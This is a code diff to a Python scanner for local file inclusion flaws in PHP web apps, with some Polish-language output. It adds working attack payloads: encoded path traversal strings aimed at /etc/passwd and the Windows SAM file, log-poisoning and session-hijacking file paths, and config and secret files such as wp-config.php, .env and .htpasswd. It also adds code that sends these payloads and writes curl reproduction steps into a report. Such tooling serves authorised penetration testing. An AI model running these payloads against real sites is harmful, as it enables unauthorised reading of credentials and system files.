@@ -362,6 +362,10 @@ class LFIWrapperScanner:
             'database.php.bak',
         ]
         
+        # Add advanced payloads from real cases
+        advanced_payloads = self.generate_advanced_wrappers()
+        test_files.extend(advanced_payloads)
+        
         # target dir flag 
         if self.target_dir:
             test_files.insert(0, self.target_dir)
@@ -444,6 +448,61 @@ class LFIWrapperScanner:
                     wrappers.append(wrapper + file)
         
         return list(set(wrappers))
+
+    def generate_advanced_wrappers(self):
+        advanced_payloads = []
+        
+        # Case 1: Double encoding & special chars
+        double_encoded = [
+            '....//....//....//....//....//etc/passwd',
+            '..%255c..%255c..%255c..%255cwindows\\win.ini',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
+            '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
+        ]
+        
+        # Case 2: Windows-specific paths
+        windows_paths = [
+            '..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            'c:\\windows\\system32\\config\\sam',
+            '..%5c..%5c..%5c..%5c..%5cboot.ini',
+            '..//..//..//..//..//windows/win.ini',
+        ]
+        
+        # Case 3: Log poisoning pre-work
+        log_poisoning = [
+            '/var/log/apache2/access.log',
+            '/var/log/nginx/access.log', 
+            '/var/log/httpd/access_log',
+            '/var/log/auth.log',
+            '/var/www/logs/access.log',
+            'C:\\xampp\\apache\\logs\\access.log',
+        ]
+        
+        # Case 4: Configuration files
+        config_files = [
+            '/.htpasswd',
+            '/.git/config',
+            '/.env.local',
+            '/app/config/parameters.yml',
+            '/var/www/html/wp-config.php',
+            '/config/config.inc.php',
+            '/etc/apache2/.htpasswd',
+        ]
+        
+        # Case 5: Session hijacking
+        session_files = [
+            '/tmp/sess_1234567890',
+            '/var/lib/php5/sess_1234567890',
+            '/var/lib/php/sessions/sess_1234567890',
+        ]
+        
+        advanced_payloads.extend(double_encoded)
+        advanced_payloads.extend(windows_paths)
+        advanced_payloads.extend(log_poisoning)
+        advanced_payloads.extend(config_files)
+        advanced_payloads.extend(session_files)
+        
+        return advanced_payloads
 
     def generate_version_specific_wrappers(self, php_version: str):
         version_specific = []
@@ -535,6 +594,18 @@ class LFIWrapperScanner:
             'PHP Version': {'confidence': 'high', 'type': 'RCE', 'file': 'phpinfo'},
         }
         
+        # Additional indicators from real reports
+        additional_indicators = {
+            'database_password': {'confidence': 'high', 'type': 'LFI', 'file': 'config file'},
+            'API_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'environment file'},
+            'SECRET_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'secret key'},
+            'AWS_ACCESS_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'AWS credentials'},
+            'ssh-rsa': {'confidence': 'high', 'type': 'LFI', 'file': 'SSH public key'},
+            '-----BEGIN PRIVATE KEY-----': {'confidence': 'high', 'type': 'LFI', 'file': 'private key'},
+        }
+        
+        indicators.update(additional_indicators)
+        
         for pattern, info in indicators.items():
             if pattern in content:
                 return info
@@ -569,7 +640,6 @@ class LFIWrapperScanner:
             if pattern in rot13_content:
                 return {'confidence': 'high', 'type': 'LFI', 'file': f"ROT13 encoded {info['file']}"}
         
-        # special cases
         if wrapper.startswith('expect://'):
             if 'www-data' in content or 'root' in content or 'uid=' in content:
                 return {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'}
@@ -584,35 +654,165 @@ class LFIWrapperScanner:
         
         return None
 
+    def enhanced_verify_vulnerability(self, content: str, wrapper: str, response):
+    
+        verification = self.verify_vulnerability(content, wrapper)
+        if not verification:
+            return None
+
+        suspicious_headers = {
+            'X-Powered-By': 'Ujawnia technologię backendu',
+            'Server': 'Ujawnia wersję serwera',
+            'X-Debug-Token': 'Tryb debugowania włączony',
+        }
+    
+        header_info = []
+        for header, desc in suspicious_headers.items():
+            if header in response.headers:
+                header_info.append(f"{header}: {response.headers[header]} - {desc}")
+    
+        if header_info:
+            verification['headers'] = header_info
+    
+        return verification
+
+    def generate_reproduction_steps(self, target_url: str, parameter: str, wrapper: str, verification_info: dict):
+    
+        separator = '&' if '?' in target_url else '?'
+        encoded_payload = urllib.parse.quote(wrapper)
+        full_url = f"{target_url}{separator}{parameter}={encoded_payload}"
+    
+        steps = [
+            f"{Color.BOLD}Kroki do odtworzenia:{Color.END}",
+            f"1. {Color.GREEN}Wykonaj zapytanie:{Color.END}",
+            f"   {Color.CYAN}curl -k '{full_url}'{Color.END}",
+            f"   {Color.CYAN}lub{Color.END}",
+            f"   {Color.CYAN}wget --no-check-certificate '{full_url}'{Color.END}",
+            "",
+            f"2. {Color.GREEN}W przeglądarce:{Color.END}",
+            f"   {Color.CYAN}{full_url}{Color.END}",
+            "",
+            f"3. {Color.GREEN}Uzasadnienie:{Color.END}",
+        ]
+    
+        if wrapper.startswith('php://filter'):
+            steps.append(f"   {Color.YELLOW}PHP filter wrapper pozwala na odczyt plików poprzez konwersję base64{Color.END}")
+            steps.append(f"   {Color.YELLOW}Skrypt ominął restrykcje dostępu do systemu plików{Color.END}")
+        elif wrapper.startswith('data://'):
+            steps.append(f"   {Color.YELLOW}Data wrapper umożliwia wykonanie kodu PHP poprzez data URI{Color.END}")
+            steps.append(f"   {Color.YELLOW}Serwer przetwarza zawartość data:// jako kod PHP{Color.END}")
+        elif wrapper.startswith('expect://'):
+            steps.append(f"   {Color.YELLOW}Expect wrapper wykonuje polecenia systemowe{Color.END}")
+            steps.append(f"   {Color.YELLOW}Demonstruje to zdalne wykonanie kodu (RCE){Color.END}")
+        elif '/etc/passwd' in wrapper or 'etc/passwd' in wrapper:
+            steps.append(f"   {Color.YELLOW}Udane odczytanie /etc/passwd potwierdza LFI{Color.END}")
+            steps.append(f"   {Color.YELLOW}Path traversal pozwala na dostęp poza katalog root{Color.END}")
+        elif 'proc/self' in wrapper:
+            steps.append(f"   {Color.YELLOW}Dostęp do /proc/self ujawnia informacje o procesie{Color.END}")
+            steps.append(f"   {Color.YELLOW}Może prowadzić do ujawnienia zmiennych środowiskowych{Color.END}")
+    
+        steps.extend([
+            "",
+            f"4. {Color.GREEN}Wpływ:{Color.END}",
+            f"   {Color.RED}{verification_info['type']} - {self.get_impact_description(verification_info['type'])}{Color.END}",
+        ])
+    
+        return "\n".join(steps)
+
+    def get_impact_description(self, vuln_type: str):
+        impacts = {
+            'LFI': 'Local File Inclusion - odczyt poufnych plików systemowych',
+            'RCE': 'Remote Code Execution - wykonanie dowolnego kodu na serwerze',
+            'RFI': 'Remote File Inclusion - załadowanie zdalnego pliku',
+            'Directory Traversal': 'Przeglądanie dowolnych katalogów',
+        }
+        return impacts.get(vuln_type, 'Nieznany typ podatności')
+
+    def generate_report(self, target_url: str, parameter: str, vulnerabilities: list):
+    
+        report = [
+            f"# LFI Vulnerability Report",
+            f"Target: {target_url}",
+            f"Parameter: {parameter}",
+            f"Scan date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            f"PHP version: {self.detected_php_version or 'Unknown'}",
+            f"",
+            f"## Summary",
+            f"Found {len(vulnerabilities)} vulnerable payloads",
+            f"",
+            f"## Vulnerabilities",
+        ]
+    
+        for i, vuln in enumerate(vulnerabilities, 1):
+            report.extend([
+                f"### Vulnerability #{i}",
+                f"- **Type**: {vuln['type']}",
+                f"- **Confidence**: {vuln['confidence']}",
+                f"- **Payload**: `{vuln['wrapper']}`",
+                f"- **File accessed**: {vuln.get('file', 'Unknown')}",
+                f"",
+                f"#### Reproduction Steps",
+                f"```bash",
+                f"curl -k '{target_url}?{parameter}={urllib.parse.quote(vuln['wrapper'])}'",
+                f"```",
+                f"",
+                f"#### Impact",
+                f"{self.get_impact_description(vuln['type'])}",
+                f"",
+                f"---",
+            ])
+    
+        return "\n".join(report)
+
+    def save_report(self, report: str, filename: str = None):
+        """Zapisuje raport do pliku"""
+        if not filename:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"lfi_scan_report_{timestamp}.md"
+    
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(report)
+    
+        self.print_status(f"Report saved to: {filename}", 'success')
+
     def test_payload(self, target_url: str, parameter: str, wrapper: str):
         separator = '&' if '?' in target_url else '?'
         test_url = f"{target_url}{separator}{parameter}={urllib.parse.quote(wrapper)}"
-        
+    
         try:
             response = self.session.get(test_url, timeout=5, verify=False)
-            
+        
             if response.status_code == 200 and len(response.text) > 0:
-                verification = self.verify_vulnerability(response.text, wrapper)
+                verification = self.enhanced_verify_vulnerability(response.text, wrapper, response)
                 if verification:
                     color = Color.RED if verification['confidence'] == 'high' else Color.YELLOW
-                    self.print_status(f"✓ VULNERABLE - Parameter: {parameter} | Payload: {wrapper}", 'success')
+                    self.print_status(f"✓ VULNERABLE - Parameter: {parameter}", 'success')
                     self.print_status(f"  → Type: {verification['type']} | Confidence: {verification['confidence']} | File: {verification['file']}", 'verified')
-
-                    self.print_status("Body:", 'info')
+                
+                    # Pokaz kroki reprodukcji
+                    reproduction_steps = self.generate_reproduction_steps(target_url, parameter, wrapper, verification)
+                    print(reproduction_steps)
+                
+                    self.print_status("Response preview:", 'info')
                     preview = response.text[:500] + "..." if len(response.text) > 500 else response.text
-                    print (f"{Color.CYAN}{preview}{Color.END}")
-                    return True
-                else:
-                    self.print_status(f"✗ Not vulnerable - Parameter: {parameter} | Payload: {wrapper}", 'error')
-            else:
-                self.print_status(f"✗ HTTP {response.status_code} - Parameter: {parameter} | Payload: {wrapper}", 'error')
+                    print(f"{Color.CYAN}{preview}{Color.END}")
+                
+                    return {
+                        'wrapper': wrapper,
+                        'type': verification['type'],
+                        'confidence': verification['confidence'],
+                        'file': verification.get('file', 'Unknown'),
+                        'response_preview': preview
+                    }
+        
+            self.print_status(f"✗ Not vulnerable - Payload: {wrapper[:100]}...", 'error')
             
         except Exception as e:
-            self.print_status(f"✗ Failed - Parameter: {parameter} | Payload: {wrapper} ({str(e)})", 'error')
-        
-        return False
+            self.print_status(f"✗ Failed - Payload: {wrapper} ({str(e)})", 'error')
+    
+        return None
 
-    def scan(self, target_url: str, parameter: str):
+    def scan(self, target_url: str, parameter: str, export_report: bool = True):
         self.print_status(f"Starting LFI scan: {target_url}", 'info')
         self.print_status(f"Testing parameter: {parameter}", 'info')
         if self.proxy:
@@ -621,14 +821,15 @@ class LFIWrapperScanner:
             self.print_status(f"Target directory: {self.target_dir}", 'info')
         self.print_status("SSL verification: DISABLED (self-signed certs supported)", 'info')
         print("-" * 60)
-        
+    
         version_info = self.detect_php_version(target_url)
-        
+        vulnerabilities = []
+    
         if version_info:
             for info in version_info:
                 self.print_status(f"PHP version detected: {info['version']} ({info['source']})", 'success')
                 self.detected_php_version = info['version']
-                
+            
                 vulns = self.assess_vulnerabilities_by_version(info['version'])
                 self.print_status("Version-based vulnerability assessment:", 'warning')
                 for vuln in vulns:
@@ -636,28 +837,32 @@ class LFIWrapperScanner:
         else:
             self.print_status("Could not detect PHP version", 'error')
             self.detected_php_version = "unknown"
-        
+    
         print("-" * 60)
-        
+    
         try:
             response = self.session.get(target_url, timeout=5, verify=False)
             self.print_status(f"Initial connection: HTTP {response.status_code}", 'info')
         except Exception as e:
             self.print_status(f"Connection failed: {e}", 'error')
             return
-        
+    
         wrappers = self.generate_wrappers()
         self.print_status(f"Generated {len(wrappers)} payloads for testing", 'info')
-        vulnerable_count = 0
-        
+    
         for i, wrapper in enumerate(wrappers, 1):
-            self.print_status(f"Testing payload {i}/{len(wrappers)}: {wrapper}", 'payload')
-            if self.test_payload(target_url, parameter, wrapper):
-                vulnerable_count += 1
-        
+            self.print_status(f"Testing payload {i}/{len(wrappers)}", 'payload')
+            result = self.test_payload(target_url, parameter, wrapper)
+            if result:
+                vulnerabilities.append(result)
+    
         print("-" * 60)
-        if vulnerable_count > 0:
-            self.print_status(f"Scan complete! Found {vulnerable_count} vulnerable payloads", 'success')
+        if vulnerabilities:
+            self.print_status(f"Scan complete! Found {len(vulnerabilities)} vulnerable payloads", 'success')
+        
+            if export_report:
+                report = self.generate_report(target_url, parameter, vulnerabilities)
+                self.save_report(report)
         else:
             self.print_status("Scan complete! No vulnerabilities found", 'warning')
 
@@ -687,6 +892,7 @@ def main():
     parser.add_argument('param', help='Parameter to test')
     parser.add_argument('--proxy', '-p', help='Proxy (http://proxy:port)')
     parser.add_argument('--target-dir', '-t', help='Target directory for wrapper traversal')
+    parser.add_argument('--no-report', action='store_true', help='Disable report generation')
     
     if len(sys.argv) == 1:
         parser.print_help()
@@ -700,7 +906,7 @@ def main():
         scanner.proxy = {'http': args.proxy, 'https': args.proxy}
         scanner.session.proxies.update(scanner.proxy)
     
-    scanner.scan(args.url, args.param)
+    scanner.scan(args.url, args.param, export_report=not args.no_report)
 
 if __name__ == "__main__":
     main()
